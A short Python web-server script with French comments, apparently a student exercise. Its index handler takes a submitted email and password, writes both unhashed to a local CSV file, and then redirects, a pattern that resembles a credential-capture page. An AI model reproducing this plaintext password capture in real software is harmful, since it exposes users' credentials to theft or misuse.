from serveur import get_template, render, OK, Redirect, pageDynamique, lancerServeur
import csv



# Les messages de la conversation

# La page dynamique qui affiche une conversation
#def page_conversation(url, vars):
#	""" Retourner la page de la conversation """
	# charger le patron
#	template = get_template('conversation2.html')
#	# définir les variables
#	vars['messages'] = conversation
#	# appliquer le patron
#	html = render(template, vars)
#	# retourner la page au navigateur
#	return OK(html)

def index(url, vars):
    template = get_template('index.html')
    html = render(template)
    
    nom = vars['email']
    motdepasse = vars['psw']
    
    nom2 = []
    mdp2 = []
    
    nom2.append(nom)
    mdp2.append(motdepasse)
    
    with open('Infos définitives.csv', 'w',  newline='') as fichier:
        
        # on déclare un objet writer 
        ecrivain = csv.writer(fichier)
        # quelques lignes:
        for element in nom2:
            ecrivain.writerow([element])
        for elemend in mdp2:
            ecrivain.writerow([elemend])
        fichier.close()   
    
    return Redirect(html)

def forums(url):
    template = get_template('forums.html')
    html = render(template)
    return OK(html)



# Définir les pages dynamiques :
# Le serveur appelera la fonction `page_conversation` 
# lorsqu'il recevra une requête pour la page `/conversation.html`.
pageDynamique('/index.html', index)
# De même il appelera la fonction `nouveau_message`
# lorsqu'il recevra une requête pour la page `/message`.
#pageDynamique('/message', nouveau_message)

# Lancer le serveur
lancerServeur()
